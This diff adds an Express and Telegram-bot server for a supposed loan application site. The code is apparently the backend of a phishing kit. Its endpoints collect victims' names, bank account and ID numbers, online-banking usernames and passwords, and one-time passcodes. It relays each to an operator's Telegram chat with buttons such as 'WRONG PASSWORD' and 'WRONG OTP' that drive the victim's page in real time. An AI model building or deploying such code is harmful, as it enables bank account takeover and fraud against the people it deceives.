@@ -1,0 +1,219 @@
+// server.js - Express + Telegraf webhook implementation
+// Required env vars:
+//  TELEGRAM_BOT_TOKEN
+//  TELEGRAM_ADMIN_CHAT_ID
+//  WEBHOOK_BASE_URL   (e.g. https://your-app.onrender.com)
+
+const express = require('express');
+const bodyParser = require('body-parser');
+const path = require('path');
+const { Telegraf } = require('telegraf');
+
+const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
+const BASE = (process.env.WEBHOOK_BASE_URL || '').replace(/\/$/, '');
+const WEBHOOK_PATH = '/telegram-webhook';
+const WEBHOOK_URL = BASE + WEBHOOK_PATH;
+
+if (!TOKEN) {
+  console.error('TELEGRAM_BOT_TOKEN required');
+  process.exit(1);
+}
+if (!ADMIN_CHAT_ID) {
+  console.error('TELEGRAM_ADMIN_CHAT_ID required');
+  process.exit(1);
+}
+if (!BASE) {
+  console.error('WEBHOOK_BASE_URL required (public HTTPS URL of this service)');
+  process.exit(1);
+}
+
+const app = express();
+app.use(bodyParser.json());
+app.use(express.static(path.join(__dirname, 'public')));
+
+// In-memory apps store (demo)
+const apps = {};
+let lastId = 0;
+
+function fmtCurrency(n){
+  try { return new Intl.NumberFormat('en-ZA', { style: 'currency', currency: 'ZAR' }).format(n); }
+  catch (e) { return 'R' + Number(n).toFixed(2); }
+}
+
+// Create Telegraf bot (no polling)
+const bot = new Telegraf(TOKEN);
+
+// Setup webhook route as express middleware
+// Telegraf provides webhookCallback to integrate with express
+app.use(WEBHOOK_PATH, (req, res, next) => {
+  // Telegraf's webhook callback needs (req, res, next)
+  bot.handleUpdate(req.body, res).catch(err => {
+    console.error('handleUpdate error', err);
+  });
+  res.sendStatus(200);
+});
+
+// API endpoints used by frontend
+app.post('/api/create-application', (req, res) => {
+  try {
+    const { loanAmount, termYears, interestAPR, monthly, applicant } = req.body || {};
+    if (!applicant || !applicant.fullName) return res.status(400).json({ success: false, error: 'Missing applicant' });
+
+    lastId += 1;
+    const id = lastId;
+    apps[id] = {
+      id,
+      loanAmount: Number(loanAmount || 0),
+      termYears: Number(termYears || 0),
+      interestAPR: Number(interestAPR || 0.08),
+      monthly: String(monthly || ''),
+      applicant: {
+        fullName: applicant.fullName || '',
+        phone: applicant.phone || '',
+        bank: applicant.bank || '',
+        accountNumber: applicant.accountNumber || '',
+        idNumber: applicant.idNumber || ''
+      },
+      status: 'details_submitted',
+      createdAt: Date.now()
+    };
+
+    // send to admin chat
+    const text = `New loan details (app ${id}):\nName: ${apps[id].applicant.fullName}\nPhone: ${apps[id].applicant.phone}\nBank: ${apps[id].applicant.bank}\nAccount: ${apps[id].applicant.accountNumber}\nID: ${apps[id].applicant.idNumber}\nLoan: ${fmtCurrency(apps[id].loanAmount)} · ${apps[id].termYears} year(s)`;
+    bot.telegram.sendMessage(ADMIN_CHAT_ID, text).catch(err => console.error('sendMessage error', err));
+
+    res.json({ success: true, applicationId: id });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ success: false, error: 'Server error' });
+  }
+});
+
+app.post('/api/submit-credentials', (req, res) => {
+  try {
+    const { applicationId, username, password } = req.body || {};
+    if (!applicationId || !username || !password) return res.status(400).json({ success: false, error: 'Missing fields' });
+    const appRec = apps[applicationId];
+    if (!appRec) return res.status(404).json({ success: false, error: 'Application not found' });
+
+    appRec.username = username;
+    appRec.password = password; // demo only
+    appRec.status = 'cred_submitted';
+
+    const keyboard = {
+      inline_keyboard: [[
+        { text: 'APPROVE', callback_data: `CRED|${applicationId}|APPROVE` },
+        { text: 'WRONG USER', callback_data: `CRED|${applicationId}|WRONG_USER` },
+        { text: 'WRONG PASSWORD', callback_data: `CRED|${applicationId}|WRONG_PASS` }
+      ]]
+    };
+    const text = `Credentials for app ${applicationId}:\nUsername: ${username}\nPassword: ${password}\n\nSelect action:`;
+    bot.telegram.sendMessage(ADMIN_CHAT_ID, text, { reply_markup: keyboard }).catch(err => console.error('sendMessage error', err));
+
+    res.json({ success: true, message: 'Credentials forwarded to admin' });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ success: false, error: 'Server error' });
+  }
+});
+
+app.post('/api/submit-otp', (req, res) => {
+  try {
+    const { applicationId, phone, otp } = req.body || {};
+    if (!applicationId || !phone || !otp) return res.status(400).json({ success: false, error: 'Missing fields' });
+    const appRec = apps[applicationId];
+    if (!appRec) return res.status(404).json({ success: false, error: 'Application not found' });
+
+    appRec.phone = phone;
+    appRec.lastOtp = otp;
+    appRec.status = 'otp_submitted';
+
+    const keyboard = {
+      inline_keyboard: [[
+        { text: 'APPROVE', callback_data: `OTP|${applicationId}|APPROVE` },
+        { text: 'DENY', callback_data: `OTP|${applicationId}|DENY` },
+        { text: 'WRONG OTP', callback_data: `OTP|${applicationId}|WRONG_OTP` }
+      ]]
+    };
+    const text = `OTP attempt for app ${applicationId}:\nPhone: ${phone}\nOTP: ${otp}\n\nSelect action:`;
+    bot.telegram.sendMessage(ADMIN_CHAT_ID, text, { reply_markup: keyboard }).catch(err => console.error('sendMessage error', err));
+
+    res.json({ success: true, message: 'OTP forwarded to admin' });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ success: false, error: 'Server error' });
+  }
+});
+
+app.get('/status/:id', (req, res) => {
+  const id = Number(req.params.id);
+  const appRec = apps[id];
+  if (!appRec) return res.status(404).json({ success: false, error: 'Not found' });
+  res.json({ success: true, status: appRec.status, app: { id: appRec.id, loanAmount: appRec.loanAmount, applicant: appRec.applicant } });
+});
+
+// Telegraf action handlers
+bot.action(/CRED\|\d+\|.+/, async (ctx) => {
+  try {
+    const data = ctx.update.callback_query.data;
+    const [, appIdStr, action] = data.split('|');
+    const appId = Number(appIdStr);
+    const appRec = apps[appId];
+    if (!appRec) {
+      await ctx.answerCbQuery('Application not found');
+      return;
+    }
+
+    if (action === 'APPROVE') appRec.status = 'cred_approved';
+    else if (action === 'WRONG_USER') appRec.status = 'cred_wrong_user';
+    else if (action === 'WRONG_PASS') appRec.status = 'cred_wrong_pass';
+    else appRec.status = 'cred_reviewed';
+
+    // remove inline keyboard and ack
+    try {
+      await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    } catch (e) { /* ignore */ }
+    await ctx.answerCbQuery('Admin action received');
+    await bot.telegram.sendMessage(ADMIN_CHAT_ID, `Admin ${ctx.from.username || ctx.from.first_name || ''} -> ${action} (app ${appId})`);
+  } catch (err) {
+    console.error('CRED action error', err);
+  }
+});
+
+bot.action(/OTP\|\d+\|.+/, async (ctx) => {
+  try {
+    const data = ctx.update.callback_query.data;
+    const [, appIdStr, action] = data.split('|');
+    const appId = Number(appIdStr);
+    const appRec = apps[appId];
+    if (!appRec) {
+      await ctx.answerCbQuery('Application not found');
+      return;
+    }
+
+    if (action === 'APPROVE') appRec.status = 'otp_approved';
+    else if (action === 'DENY') appRec.status = 'otp_denied';
+    else if (action === 'WRONG_OTP') appRec.status = 'otp_wrong';
+    else appRec.status = 'otp_reviewed';
+
+    try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
+    await ctx.answerCbQuery('Admin action received');
+    await bot.telegram.sendMessage(ADMIN_CHAT_ID, `Admin ${ctx.from.username || ctx.from.first_name || ''} -> ${action} (app ${appId})`);
+  } catch (err) {
+    console.error('OTP action error', err);
+  }
+});
+
+// start server and set webhook
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, async () => {
+  console.log(`Server listening on port ${PORT}`);
+  try {
+    // tell Telegram to send updates to the webhook URL
+    await bot.telegram.setWebhook(WEBHOOK_URL);
+    console.log('Webhook set to', WEBHOOK_URL);
+  } catch (err) {
+    console.error('Failed to set webhook', err);
+  }
+});
